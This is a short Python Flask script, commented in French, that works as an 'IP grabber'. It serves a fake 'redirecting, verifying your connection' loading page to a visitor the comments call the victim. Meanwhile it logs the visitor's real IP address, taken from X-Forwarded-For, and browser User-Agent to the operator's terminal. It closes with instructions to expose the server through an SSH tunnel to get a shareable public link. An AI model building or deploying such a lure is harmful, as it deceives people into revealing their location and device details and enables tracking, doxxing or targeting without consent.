from flask import Flask, request, render_template_string
import os

app = Flask(__name__)

# --- LA PAGE QUE LA VICTIME VA VOIR ---
# On fait croire à un chargement ou une redirection
HTML_PAGE = '''
<!DOCTYPE html>
<html style="background: #000; color: #00ff00; font-family: monospace; text-align: center;">
<head><title>Loading...</title></head>
<body>
    <div style="margin-top: 150px;">
        <h2>REDIRECTING TO CONTENT...</h2>
        <p>Please wait while we verify your connection.</p>
        <div style="border: 1px solid #00ff00; width: 200px; margin: auto; height: 10px;">
            <div style="background: #00ff00; width: 60%; height: 100%;"></div>
        </div>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    # 1. On cherche d'abord l'IP transmise par le tunnel (X-Forwarded-For)
    # 2. Si elle n'existe pas, on prend l'IP directe
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Si l'IP contient une virgule, on prend la première de la liste
    if ',' in ip:
        ip = ip.split(',')[0]

    ua = request.headers.get('User-Agent')

    print(f"\n\033[92m[+] LIEN PUBLIC OUVERT ! \033[0m")
    print(f" > Vraie IP détectée : \033[93m{ip}\033[0m")
    print(f" > Appareil : {ua}")
    print("-" * 30)
    
    return render_template_string(HTML_PAGE)

if __name__ == '__main__':
    os.system('clear')
    print("\033[95m" + "="*50)
    print("       LINK GRABBER ACTIVÉ (PORT 5000)".center(50))
    print("="*50 + "\033[0m")
    print("\n1. Ton serveur tourne localement.")
    print("2. Pour avoir le lien public, tape la commande SSH dans un autre terminal.")
    
    app.run(port=5000)
